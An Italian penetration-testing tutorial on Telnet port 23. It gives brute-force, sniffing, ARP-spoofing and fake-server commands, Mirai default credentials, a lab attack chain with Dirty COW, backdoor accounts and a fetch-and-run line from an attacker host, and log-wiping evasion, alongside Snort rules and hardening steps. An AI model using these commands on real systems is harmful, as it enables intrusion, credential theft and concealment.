---
title: 'Porta 23 Telnet: Credenziali in Chiaro, Sniffing e Brute Force'
slug: porta-23-telnet
description: >-
  La porta 23 Telnet è una critical finding immediata: trasmette credenziali in
  chiaro, facilita brute force, sniffing e accesso remoto insicuro. Scopri come
  enumerarla, attaccarla e metterla in sicurezza.
image: /porta-23-telnet.webp
draft: false
date: 2026-04-10T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - telnet-sniffing
  - default-credentials
---

La porta 23 è il gateway **completamente non cifrato** verso l'amministrazione remota — e rappresenta la vulnerabilità più critica che un sistema possa esporre a Internet. Telnet (Telecommunication Network) trasmette **username, password e ogni comando in chiaro assoluto**, rendendo ogni sessione intercettabile con un semplice packet sniffer. Sviluppato nel 1969 (RFC 854), Telnet predatende la crittografia di rete di oltre due decenni e non ha mai implementato alcuna forma di protezione dei dati. In ambiente lab e CTF, la porta 23 è il target più semplice e diretto: dalle credenziali di default all'intercettazione con Wireshark fino al brute force senza rate limiting, ogni tecnica di attacco funziona senza ostacoli crittografici.

Telnet sopravvive nel 2026 solo in contesti legacy irrecuperabili: **router industriali** e switch gestiti prodotti pre-2010 che non supportano [SSH](https://hackita.it/articoli/ssh), **dispositivi embedded** (stampanti di rete, KVM-over-IP, PDU intelligenti, telecamere IP economiche), **PLC e SCADA** in impianti industriali dove l'aggiornamento firmware richiederebbe shutdown di produzione non sostenibili, e **laboratori CTF** come Metasploitable, DVWA e VulnHub dove Telnet viene deliberatamente esposto per scopi didattici. Ogni security audit professionale considera l'esposizione di Telnet su rete pubblica una **critical finding** con raccomandazione di remediation immediata.

***

## Come funziona il protocollo Telnet

Telnet è un protocollo client-server basato su **TCP porta 23** che fornisce accesso a terminale virtuale remoto. Opera attraverso negoziazione di opzioni (RFC 854, 855) ma senza alcuna cifratura o autenticazione sicura integrata.

**Flow completo di una sessione Telnet:**

1. **TCP Handshake** — Client e server stabiliscono connessione TCP sulla porta 23
2. **Option Negotiation** — Scambiano opzioni Telnet usando comandi IAC (Interpret As Command):
   * `WILL/WON'T` — Il sender vuole/non vuole abilitare un'opzione
   * `DO/DON'T` — Il sender vuole che il receiver abiliti/disabiliti un'opzione
3. **Terminal Type Negotiation** — Negoziano tipo terminale (VT100, ANSI, xterm)
4. **Authentication** — Il server richiede username e password **in chiaro**
5. **Interactive Session** — Shell remota completamente in plaintext
6. **Teardown** — Il client invia `exit` o `logout`, connessione TCP si chiude

**Comandi Telnet IAC (Interpret As Command):**

| Byte       | Comando | Funzione                                            |
| ---------- | ------- | --------------------------------------------------- |
| 255 (0xFF) | IAC     | Interpret As Command — prefisso per tutti i comandi |
| 251 (0xFB) | WILL    | Sender vuole abilitare opzione                      |
| 252 (0xFC) | WON'T   | Sender rifiuta opzione                              |
| 253 (0xFD) | DO      | Sender richiede al receiver di abilitare opzione    |
| 254 (0xFE) | DON'T   | Sender richiede al receiver di disabilitare opzione |
| 250 (0xFA) | SB      | Subnegotiation Begin                                |
| 240 (0xF0) | SE      | Subnegotiation End                                  |

**Opzioni Telnet comuni:**

| Opzione               | Numero | Descrizione                                      |
| --------------------- | ------ | ------------------------------------------------ |
| Echo                  | 1      | Server fa echo dei caratteri digitati dal client |
| Suppress Go Ahead     | 3      | Disabilita segnale "Go Ahead" dopo ogni comando  |
| Status                | 5      | Richiede/fornisce status della connessione       |
| Terminal Type         | 24     | Negozia tipo terminale (VT100, ANSI, ecc.)       |
| Window Size           | 31     | Comunica dimensioni finestra terminale (NAWS)    |
| Environment Variables | 36     | Passa variabili d'ambiente al server             |

Le **misconfigurazioni comuni** sulla porta 23 includono: Telnet abilitato di default senza che l'admin se ne accorga, credenziali di fabbrica mai cambiate (`admin`/`admin`, `root`/`root`), Telnet esposto su Internet senza firewall, assenza completa di rate limiting o fail2ban, e logging insufficiente o disabilitato.

***

## Enumerazione base: nmap e banner grabbing

Il primo passo è identificare la versione di Telnet e il sistema operativo target. Nmap offre script NSE specifici.

```bash
nmap -sV -sC -p 23 10.10.10.20
```

```
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
| telnet-encryption:
|_  Telnet server does not support encryption
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Parametri:** `-sV` rileva versione del servizio, `-sC` esegue script NSE di default (`telnet-encryption`, `telnet-ntlm-info` se Windows).

**Banner grabbing manuale con netcat:**

```bash
nc -vn 10.10.10.20 23
```

```
(UNKNOWN) [10.10.10.20] 23 (telnet) open
Ubuntu 16.04.3 LTS
metasploitable login:
```

Il banner rivela: **Ubuntu 16.04.3 LTS** e hostname **metasploitable**. Telnet non nasconde queste informazioni — sono parte dell'handshake standard.

**Connection test con telnet client:**

```bash
telnet 10.10.10.20
```

```
Trying 10.10.10.20...
Connected to 10.10.10.20.
Escape character is '^]'.
Ubuntu 16.04.3 LTS
metasploitable login:
```

Digitare username e password — tutto viaggia in chiaro.

***

## Enumerazione avanzata: script NSE e sniffing credenziali

Nmap include script NSE dedicati a Telnet. Il più utile è `telnet-ntlm-info` per sistemi Windows.

```bash
nmap --script="telnet-*" -p 23 10.10.10.20
```

**Tabella script NSE per Telnet:**

| Script              | Categoria     | Funzione                              | Output chiave                                |
| ------------------- | ------------- | ------------------------------------- | -------------------------------------------- |
| `telnet-encryption` | default, safe | Verifica se server supporta cifratura | `does not support encryption` se vulnerabile |
| `telnet-ntlm-info`  | safe          | Enumera info NTLM da server Windows   | NetBIOS name, DNS name, OS build             |
| `telnet-brute`      | intrusive     | Brute force credenziali               | Username/password validi                     |

**telnet-ntlm-info su Windows Server:**

```bash
nmap --script=telnet-ntlm-info -p 23 10.10.10.50
```

```
PORT   STATE SERVICE
23/tcp open  telnet
| telnet-ntlm-info:
|   Target_Name: WINSERVER
|   NetBIOS_Domain_Name: WINSERVER
|   NetBIOS_Computer_Name: SRV2019
|   DNS_Domain_Name: corp.local
|   DNS_Computer_Name: srv2019.corp.local
|   DNS_Tree_Name: corp.local
|_  Product_Version: 10.0.17763
```

Informazioni critiche per Active Directory enumeration: domain name `corp.local`, computer name `SRV2019`, Windows build `10.0.17763` (Windows Server 2019).

**Packet sniffing con Wireshark:**

Se hai accesso alla rete (MITM, ARP spoofing, o sei sulla stessa subnet):

```bash
# Capture Telnet traffic
tcpdump -i eth0 -A -n 'port 23'
```

```
10:45:23.456789 IP 10.10.14.5.54321 > 10.10.10.20.23: Flags [P.], seq 1:6, ack 1, win 229, length 5
E.....@.@...
..........admin
10:45:23.789012 IP 10.10.14.5.54321 > 10.10.10.20.23: Flags [P.], seq 6:16, ack 1, win 229, length 10
E.....@.@...
..........password123
```

Le credenziali `admin` / `password123` sono completamente visibili in chiaro.

In Wireshark: filtrare con `tcp.port == 23`, clic destro su pacchetto → Follow → TCP Stream per vedere l'intera sessione come testo.

***

## Tecniche offensive: da brute force a credential sniffing

### 1. Brute force con Hydra

Telnet è il target più facile per brute force: nessuna cifratura, rate limiting spesso assente.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://10.10.10.20
```

```
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries
[DATA] attacking telnet://10.10.10.20:23/
[23][telnet] host: 10.10.10.20   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
```

**Parametri:** `-l admin` utente singolo, `-P rockyou.txt` dizionario password, `telnet://` specifica protocollo.

**Brute force con Nmap NSE:**

```bash
nmap --script=telnet-brute --script-args userdb=users.txt,passdb=pass.txt -p 23 10.10.10.20
```

```
PORT   STATE SERVICE
23/tcp open  telnet
| telnet-brute:
|   Accounts:
|     msfadmin:msfadmin - Valid credentials
|     root:toor - Valid credentials
|_  Statistics: Performed 150 guesses in 45 seconds
```

### 2. Credenziali di default

Telnet su dispositivi embedded ha quasi sempre credenziali di fabbrica mai cambiate:

| Device              | Username  | Password            |
| ------------------- | --------- | ------------------- |
| Cisco router/switch | `cisco`   | `cisco`             |
| Cisco enable        | (nessuno) | `cisco`             |
| 3Com switch         | `admin`   | `admin` o vuoto     |
| D-Link router       | `admin`   | vuoto               |
| Netgear router      | `admin`   | `password` o `1234` |
| TP-Link router      | `admin`   | `admin`             |
| Ubiquiti            | `ubnt`    | `ubnt`              |
| APC UPS             | `apc`     | `apc`               |
| Raritan KVM         | `admin`   | `raritan`           |
| IPMI/BMC            | `ADMIN`   | `ADMIN`             |

**SecLists — Telnet default credentials:**

```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt telnet://10.10.10.20
```

Il file contiene oltre 500 combinazioni username:password di default per dispositivi comuni.

### 3. Man-in-the-Middle con Metasploit

Creare un server Telnet fasullo per intercettare credenziali:

```bash
msfconsole -q
use auxiliary/server/capture/telnet
set SRVHOST 192.168.1.100
set BANNER "Ubuntu 20.04 LTS\nlogin: "
exploit
```

```
[*] Auxiliary module running as background job 0.
[*] Server started on 192.168.1.100:23
[+] Telnet LOGIN 192.168.1.50:54321 admin / password123
```

Quando la vittima si connette al server fake, le credenziali vengono loggato in chiaro.

### 4. Sniffing con Ettercap (ARP spoofing)

Se sei sulla stessa LAN:

```bash
# ARP spoofing per MITM
ettercap -T -M arp:remote /10.10.10.1// /10.10.10.20//

# In altra finestra: capture Telnet
tcpdump -i eth0 -A -n 'port 23' -w telnet.pcap
```

Aprire `telnet.pcap` in Wireshark, Follow TCP Stream — credenziali in chiaro.

### 5. Metasploit brute force

```bash
msfconsole -q
use auxiliary/scanner/telnet/telnet_login
set RHOSTS 10.10.10.20
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set STOP_ON_SUCCESS true
run
```

```
[+] 10.10.10.20:23 - LOGIN SUCCESSFUL: msfadmin:msfadmin
[*] Command shell session 1 opened
```

***

## Tre scenari pratici da lab e CTF

### Scenario 1 — Metasploitable 2: msfadmin:msfadmin

**Contesto:** macchina Metasploitable 2 con Telnet abilitato e credenziali di default.

```bash
nmap -sV -p 23 192.168.1.100
```

```
23/tcp open  telnet  Linux telnetd
```

```bash
# Tentativo con credenziali di default comuni
telnet 192.168.1.100
# login: msfadmin
# Password: msfadmin
```

```
Welcome to Ubuntu 8.04.1 LTS (GNU/Linux 2.6.24-16-server i686)
Last login: Sat Aug 14 12:34:56 2024
msfadmin@metasploitable:~$
```

**Privilege escalation:**

```bash
msfadmin@metasploitable:~$ uname -a
# Linux metasploitable 2.6.24-16-server #1 SMP i686 GNU/Linux

# Kernel vulnerabile a Dirty COW (CVE-2016-5195)
msfadmin@metasploitable:~$ wget http://10.10.14.5/dirtycow.c
msfadmin@metasploitable:~$ gcc -pthread dirtycow.c -o dirtycow -lcrypt
msfadmin@metasploitable:~$ ./dirtycow
# [+] mmap: 0xb7fd5000
# [+] exploiting...
# [+] /etc/passwd backed up to /tmp/passwd.bak
# [+] Root password changed to: dirtyCowFun

msfadmin@metasploitable:~$ su root
# Password: dirtyCowFun
root@metasploitable:~# id
# uid=0(root) gid=0(root)
```

### Scenario 2 — Router Cisco con credenziali default

**Contesto:** router Cisco IOS con Telnet abilitato, credenziali mai cambiate.

```bash
telnet 192.168.1.1
```

```
User Access Verification
Username: cisco
Password: cisco

Router>
```

**Escalation a privileged mode:**

```
Router> enable
Password: cisco

Router#
```

**Post-exploitation:**

```
Router# show running-config
# <entire config in plaintext, includes passwords, SNMP community strings, VPN PSK>

Router# show version
# Cisco IOS Software, C2960 Software (C2960-LANBASEK9-M), Version 15.0(2)SE4

Router# write memory
# Salva config modificata

Router# configure terminal
Router(config)# username backdoor privilege 15 password 0 Password123!
Router(config)# end
Router# write memory
# Backdoor user creato con privilegi massimi
```

### Scenario 3 — Credential capture via packet sniffing

**Contesto:** penetration test interno, accesso alla LAN, sniffing traffic Telnet.

Attacker box su 192.168.1.50, target Telnet server su 192.168.1.20, admin si connette da 192.168.1.100.

```bash
# Setup packet capture
tcpdump -i eth0 -A -n 'host 192.168.1.20 and port 23' -w telnet_capture.pcap &
```

Admin si connette:

```
[admin@workstation ~]$ telnet 192.168.1.20
# Username: sysadmin
# Password: Sup3rS3cur3!
```

Attacker analizza capture:

```bash
tcpdump -A -r telnet_capture.pcap | grep -A 5 -B 5 "login:"
```

```
192.168.1.100.54321 > 192.168.1.20.23: Flags [P.], seq 1:9, ack 1, win 229, length 8
sysadmin

192.168.1.100.54321 > 192.168.1.20.23: Flags [P.], seq 9:22, ack 1, win 229, length 13
Sup3rS3cur3!
```

Credenziali catturate: `sysadmin` / `Sup3rS3cur3!`

**Riuso credenziali su SSH:**

```bash
ssh [email protected]
# Password: Sup3rS3cur3!
sysadmin@server:~$
```

Password reuse — accesso SSH ottenuto con credenziali sniffate da Telnet.

***

## Toolchain integration: dalla recon alla post-exploitation

**Pipeline completa:**

```
RECONNAISSANCE
│
├─ nmap -sV -sC -p 23 <target>             → Versione + OS detection
├─ nc -vn <target> 23                      → Banner grab manuale
└─ searchsploit telnet <version>           → CVE pubblici

ENUMERATION
│
├─ nmap --script=telnet-ntlm-info          → Windows info (NTLM)
├─ nmap --script=telnet-encryption         → Check cifratura (sempre no)
└─ Wireshark/tcpdump → passive sniffing    → Credential capture

EXPLOITATION
│
├─ A) Default credentials → manual test → Telnet access
├─ B) Brute force → hydra/nmap → valid creds → Telnet access
├─ C) Packet sniffing → tcpdump/Wireshark → captured creds → reuse
├─ D) MITM → ettercap/msfconsole → fake server → credential harvest
└─ E) IoT botnet scan → Mirai wordlist → mass compromise

POST-EXPLOITATION
│
├─ uname -a → kernel version check         → Local privesc exploit
├─ sudo -l                                 → Sudo misconfiguration
├─ find / -perm -4000 2>/dev/null          → SUID binaries
├─ wget http://attacker/linpeas.sh | bash  → Automated enum
└─ Persistence → add user / SSH key / cron
```

**Tabella comparativa strumenti:**

| Tool              | Velocità | Stealth | Use case                       |
| ----------------- | -------- | ------- | ------------------------------ |
| nmap              | Media    | Bassa   | Discovery, version detection   |
| Hydra             | Alta     | Bassa   | Brute force parallelo          |
| Medusa            | Media    | Media   | Brute force con timeout custom |
| Metasploit        | Bassa    | Bassa   | Brute force + fake server      |
| Wireshark/tcpdump | Alta     | Alta    | Passive credential sniffing    |
| Ettercap          | Media    | Bassa   | Active MITM + sniffing         |

***

## Attack chain completa end-to-end

**Scenario realistico: da scan a persistenza**

```
[00:00] RECONNAISSANCE
nmap -sV -p 21,22,23,80 192.168.1.0/24
# 192.168.1.20: Telnet open + SSH + HTTP

[00:03] ENUMERATION
nc -vn 192.168.1.20 23
# Ubuntu 18.04 LTS / hostname: fileserver

[00:05] DEFAULT CREDENTIALS TEST
telnet 192.168.1.20
# login: admin
# password: admin
# Login incorrect

[00:07] BRUTE FORCE
hydra -l admin -P /usr/share/wordlists/fasttrack.txt telnet://192.168.1.20
# [23][telnet] login: admin password: password123

[00:10] INITIAL ACCESS
telnet 192.168.1.20
# login: admin
# password: password123
admin@fileserver:~$

[00:12] ENUMERATION POST-COMPROMISE
admin@fileserver:~$ sudo -l
# (ALL) NOPASSWD: /usr/bin/find

[00:15] PRIVILEGE ESCALATION
admin@fileserver:~$ sudo find /etc/passwd -exec /bin/bash \;
root@fileserver:~# id
# uid=0(root) gid=0(root)

[00:18] PERSISTENCE
root@fileserver:~# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADA... attacker@kali' >> /root/.ssh/authorized_keys

root@fileserver:~# useradd -m -s /bin/bash -G sudo backup_user
root@fileserver:~# echo 'backup_user:BackupPass123!' | chpasswd

[00:20] LATERAL MOVEMENT
root@fileserver:~# cat /etc/passwd | grep -E '/bin/bash|/bin/sh'
# sysadmin:x:1001:1001::/home/sysadmin:/bin/bash

root@fileserver:~# cat /home/sysadmin/.bash_history
# ssh [email protected]
# password: SamePasswordEverywhere!

# Credential reuse test
ssh [email protected]
# Password: SamePasswordEverywhere!
sysadmin@dbserver:~$
```

**Timeline stimata:** 20 minuti da scan iniziale a root completo + persistenza + lateral movement.

***

## Detection e tecniche di evasion

### Lato Blue Team: cosa monitorare

I log Telnet sono critici. Su Linux, Telnet logga su `/var/log/auth.log` (Debian/Ubuntu) o `/var/log/secure` (RHEL/CentOS).

**Indicatori di compromissione (IoC) critici:**

* **Brute force:** sequenze di `authentication failure` da stesso IP
* **Login da IP anomalo:** accessi da geolocazioni inusuali o IP pubblici
* **Login root:** `session opened for user root` (se PermitRootLogin disabled ma bypassato)
* **Sniffing:** traffico sulla porta 23 da IP non autorizzati (SPAN/mirror port monitoring)
* **Multiple sessioni simultanee:** stesso utente da IP diversi contemporaneamente

**Esempio log brute force:**

```
Jun 15 10:23:15 server in.telnetd[12345]: refused connect from 203.0.113.50
Jun 15 10:23:17 server in.telnetd[12346]: authentication failure; logname= uid=0 euid=0 tty=ttyp0 ruser= rhost=203.0.113.50
Jun 15 10:23:19 server in.telnetd[12347]: authentication failure; logname= uid=0 euid=0 tty=ttyp1 ruser= rhost=203.0.113.50
Jun 15 10:23:23 server in.telnetd[12349]: session opened for user admin by (uid=0)
```

**IDS signature per Telnet brute force (Snort):**

```
alert tcp $EXTERNAL_NET any -> $HOME_NET 23 (msg:"Telnet Brute Force Attempt"; flow:to_server,established; content:"login:"; nocase; detection_filter:track by_src, count 5, seconds 60; sid:1000040; rev:1;)
```

**IDS signature per credential transmission:**

```
alert tcp $HOME_NET 23 -> $EXTERNAL_NET any (msg:"Telnet Cleartext Credential Leak"; flow:from_server,established; content:"Password:"; nocase; sid:1000041; rev:1;)
```

### Lato Red Team: evasion e OPSEC

**1. Brute force rallentato:**

```bash
# Single thread, pausa 10 secondi tra tentativi
hydra -l admin -P top50.txt -t 1 -W 10 telnet://192.168.1.20
```

Sotto soglia IDS standard (5 tentativi in 60 secondi).

**2. Evitare pattern riconoscibili:**

```bash
# Randomizzare ordine username
shuf users.txt > users_random.txt
hydra -L users_random.txt -P passwords.txt telnet://192.168.1.20
```

**3. Connessioni da IP diversi:**

```bash
# Usare proxy SOCKS o VPN per cambiare IP sorgente
proxychains telnet 192.168.1.20
```

**4. Cleanup post-operazione:**

```bash
# Rimuovere entry da auth.log (se root)
sed -i '/203.0.113.50/d' /var/log/auth.log

# Rimuovere command history
history -c
rm ~/.bash_history
ln -sf /dev/null ~/.bash_history

# Rimuovere backdoor user
userdel -r backup_user
```

***

## Performance e scaling multi-target

### Single target vs subnet scan

Per un singolo target, la scansione completa richiede 5-10 secondi:

```bash
time nmap -sV -p 23 192.168.1.20
# real    0m8.123s
```

Su subnet più ampie (stile IoT botnet scanning):

```bash
# Fase 1: discovery veloce (30 secondi - 2 minuti su /24)
masscan -p23 192.168.1.0/24 --rate 1000 -oL telnet_hosts.txt

# Fase 2: estrai IP con porta 23 aperta
grep "open" telnet_hosts.txt | awk '{print $4}' > targets.txt

# Fase 3: brute force con dizionario Mirai
cat targets.txt | parallel -j 20 hydra -C mirai_credentials.txt telnet://{}
```

**Dizionario Mirai (top 10 combinazioni):**

```
root:xc3511
root:vizxv
root:admin
admin:admin
root:888888
root:xmhdipc
root:default
root:juantech
root:123456
root:54321
```

Questi 10 account compromettono il **\~40% dei device IoT** esposti a Internet.

### Brute force parallelo con GNU Parallel

```bash
# Brute force simultaneo su 50 host (2 thread per host = 100 thread totali)
cat targets.txt | parallel -j 50 hydra -C mirai_credentials.txt -t 2 telnet://{}
```

**Stima performance:** con `-t 2` (2 thread) su 50 host paralleli, si testano **100 credenziali/secondo**. Per 100 combinazioni su 500 target: \~5 minuti.

***

## Troubleshooting: errori comuni e fix rapidi

| Errore                                                    | Causa probabile                                     | Fix immediato                                    |
| --------------------------------------------------------- | --------------------------------------------------- | ------------------------------------------------ |
| `Connection refused`                                      | Telnet non in ascolto o firewall                    | Verificare con `nmap -p 23` e `nc -vn target 23` |
| `Network is unreachable`                                  | Routing errato o subnet diversa                     | Verificare `ip route` e connettività con `ping`  |
| Prompt login non appare                                   | Server sta aspettando option negotiation            | Premere Invio 2-3 volte                          |
| `Login incorrect` ripetuto                                | Credenziali errate o account bloccato               | Provare credenziali di default o brute force     |
| Connessione si chiude immediatamente                      | TCP wrapper `/etc/hosts.deny` blocca IP             | Provare da IP diverso o subnet interna           |
| `EOF from remote side`                                    | Server ha chiuso connessione (ban IP, max sessions) | Attendere o cambiare IP                          |
| Caratteri strani/corrotti                                 | Mismatch terminal type                              | Settare `TERM=vt100` o `TERM=ansi`               |
| Hydra `[ERROR] target telnet://X does not support telnet` | Porta 23 aperta ma non Telnet                       | Verificare manualmente con `nc` o `telnet`       |

***

## FAQ — domande operative

**Perché Telnet è considerato così insicuro?**

Trasmette **tutto in chiaro**: username, password, comandi, output. Chiunque sulla rete (stesso switch, SPAN port, ISP, MITM) può leggere ogni byte con Wireshark. Non ha autenticazione forte, cifratura o integrità dei dati.

**Esiste Telnet sicuro (TLS/SSL)?**

Esistono implementazioni come `telnet-ssl` e `telnetd-ssl` che wrappano Telnet in TLS, ma sono rarissime. Il 99.9% dei server Telnet è plaintext. La soluzione corretta è usare SSH (porta 22).

**Posso fare brute force su Telnet senza essere bannato?**

La maggior parte dei server Telnet legacy **non ha fail2ban o rate limiting**. È possibile fare brute force aggressivo senza ban. Tuttavia, IDS/IPS aziendali rileveranno comunque.

**Come distinguo Telnet da altri servizi sulla porta 23?**

Banner grab con `nc` o `telnet`. Telnet risponde con option negotiation (byte `0xFF 0xFB ...`). Altri servizi (HTTP misconfigured, backdoor) rispondono diversamente.

**Quali sono le credenziali di default più comuni?**

Top 5: `admin:admin`, `root:root`, `cisco:cisco`, `admin:password`, `root:toor`. Per IoT: `admin:`, `root:xc3511`, `root:vizxv` (Mirai botnet).

**Posso sniffare Telnet su WiFi?**

Sì, se WiFi non è cifrato (Open network) o hai la chiave WPA. Anche su WiFi cifrato, se sei connesso alla stessa rete puoi sniffare traffico broadcast/multicast. Con ARP spoofing puoi intercettare traffico unicast.

**Telnet funziona su porte diverse dalla 23?**

Sì, può essere configurato su qualsiasi porta. Scan completo: `nmap -p- --open -sV <target>` e cercare `telnet` nella colonna SERVICE.

***

## Cheat sheet finale

| Azione                          | Comando                                                                             |
| ------------------------------- | ----------------------------------------------------------------------------------- |
| Scan versione + default scripts | `nmap -sV -sC -p 23 <target>`                                                       |
| Banner grab                     | `nc -vn <target> 23`                                                                |
| Check encryption support        | `nmap --script=telnet-encryption -p 23 <target>`                                    |
| Windows NTLM info               | `nmap --script=telnet-ntlm-info -p 23 <target>`                                     |
| Brute force (Hydra)             | `hydra -l admin -P rockyou.txt telnet://<target>`                                   |
| Brute force (Nmap)              | `nmap --script=telnet-brute --script-args userdb=u.txt,passdb=p.txt -p 23 <target>` |
| Brute force (Metasploit)        | `use auxiliary/scanner/telnet/telnet_login`                                         |
| Default creds (SecLists)        | `hydra -C telnet-betterdefaultpasslist.txt telnet://<target>`                       |
| Login manuale                   | `telnet <target>`                                                                   |
| Login porta non standard        | `telnet <target> 2323`                                                              |
| Packet sniffing (tcpdump)       | `tcpdump -i eth0 -A -n 'port 23' -w telnet.pcap`                                    |
| Packet sniffing (Wireshark)     | Filter: `tcp.port == 23` → Follow TCP Stream                                        |
| MITM fake server                | `msfconsole → use auxiliary/server/capture/telnet`                                  |
| ARP spoofing (Ettercap)         | `ettercap -T -M arp:remote /gateway// /target//`                                    |
| Cerca CVE                       | `searchsploit telnet <version>`                                                     |
| Mass scan IoT                   | `masscan -p23 0.0.0.0/0 --rate 10000` (illegale senza permesso!)                    |

***

## Perché la porta 23 Telnet è ancora rilevante nel 2026

Nonostante SSH sia lo standard dal 1995, Telnet persiste in contesti dove la migrazione è impossibile o non prioritaria. I **dispositivi embedded IoT** prodotti tra 2005-2015 (milioni di router domestici, telecamere IP, DVR/NVR, stampanti di rete) hanno firmware che non supporta SSH e non riceverà mai aggiornamenti. Gli **impianti industriali SCADA/ICS** con PLC Siemens, Schneider, ABB installati negli anni 2000 usano Telnet per configurazione e non possono essere spenti per upgrade firmware senza fermare linee produttive. I **laboratori di sicurezza e CTF** mantengono Telnet come teaching tool — Metasploitable, DVWA, VulnHub espongono deliberatamente la porta 23 per scopi didattici. Nei **penetration test aziendali**, trovare Telnet esposto è raro ma quando accade è una **critical finding immediata** con remediation priority P0.

## Differenze chiave: Telnet vs SSH

| Caratteristica          | Telnet (23)          | SSH (22)                   |
| ----------------------- | -------------------- | -------------------------- |
| Cifratura               | ❌ Cleartext completo | ✅ AES256-CTR               |
| Autenticazione          | Password cleartext   | Password + publickey + 2FA |
| Integrità dati          | ❌ Nessuna            | ✅ HMAC                     |
| Sniffing resistance     | ❌ Zero               | ✅ Alta                     |
| Port forwarding         | ❌ No                 | ✅ Sì (-L/-R/-D)            |
| File transfer           | ❌ No                 | ✅ SCP/SFTP                 |
| Anno creazione          | 1969                 | 1995                       |
| Use case legittimo 2026 | Legacy/lab only      | Standard produzione        |

**Quando usare Telnet:** Mai in produzione. Solo lab controllati, CTF, reverse engineering firmware embedded.
**Quando usare SSH:** Sempre per amministrazione remota sicura.

## Hardening: come chiudere Telnet in produzione

**Opzione 1 — Disabilitare completamente (raccomandato):**

Linux (systemd):

```bash
systemctl stop telnet.socket
systemctl disable telnet.socket
systemctl mask telnet.socket
apt remove telnetd
```

Linux (xinetd):

```bash
# /etc/xinetd.d/telnet
service telnet
{
    disable = yes
}
systemctl restart xinetd
```

Cisco IOS:

```
Router(config)# no transport input telnet
Router(config)# transport input ssh
Router(config)# line vty 0 4
Router(config-line)# transport input ssh
```

**Opzione 2 — Restringere accesso (se disabilitare è impossibile):**

TCP Wrappers (`/etc/hosts.allow`):

```
in.telnetd: 192.168.1.0/24, 10.0.0.0/8
```

`/etc/hosts.deny`:

```
in.telnetd: ALL
```

Iptables:

```bash
# Permetti Telnet solo da IP management
iptables -A INPUT -p tcp --dport 23 -s 192.168.100.50 -j ACCEPT
iptables -A INPUT -p tcp --dport 23 -j DROP
```

**Opzione 3 — TLS wrapper (raro, meglio SSH):**

```bash
apt install stunnel4
```

`/etc/stunnel/telnet-tls.conf`:

```
[telnet-ssl]
accept = 992
connect = 23
cert = /etc/ssl/certs/server.pem
key = /etc/ssl/private/server.key
```

Client connette a porta 992 con TLS, stunnel decifra e forward a Telnet locale porta 23.

## OPSEC: stealth per Telnet (scenario difensivo)

In operazioni Red Team autorizzate:

1. **Evitare Telnet se possibile** — Troppo rumoroso, troppo facile da rilevare
2. **Se obbligatorio:** Brute force rallentato `-t 1 -W 15`, sotto soglia IDS
3. **Preferire sniffing passivo** — Wireshark/tcpdump su SPAN port, zero rumore
4. **Cleanup completo:** Rimuovere log entries, command history, backdoor users

**In ambiente CTF:** Telnet è spesso il path più veloce verso initial access — non serve stealth.

***

> **Disclaimer:** Tutti i comandi e le tecniche descritte in questo articolo sono destinati esclusivamente all'uso in ambienti autorizzati: laboratori personali, macchine virtuali CTF come Metasploitable/HackTheBox/TryHackMe e penetration test con autorizzazione scritta del proprietario del sistema. L'accesso non autorizzato a sistemi informatici è un reato penale in Italia (art. 615-ter c.p.) e nella maggior parte delle giurisdizioni internazionali. Lo sniffing di traffico di rete altrui senza consenso è reato (art. 617-quater c.p.). L'autore e HackIta declinano ogni responsabilità per usi impropri di queste informazioni. Per ulteriori dettagli sul protocollo Telnet, consultare RFC 854 ([https://www.rfc-editor.org/rfc/rfc854.html](https://www.rfc-editor.org/rfc/rfc854.html)) e RFC 855 ([https://www.rfc-editor.org/rfc/rfc855.html](https://www.rfc-editor.org/rfc/rfc855.html)).

Vuoi supportare HackIta? Visita hackita.it/supporto per donazioni. Per penetration test professionali e formazione 1:1, scopri hackita.it/servizi.
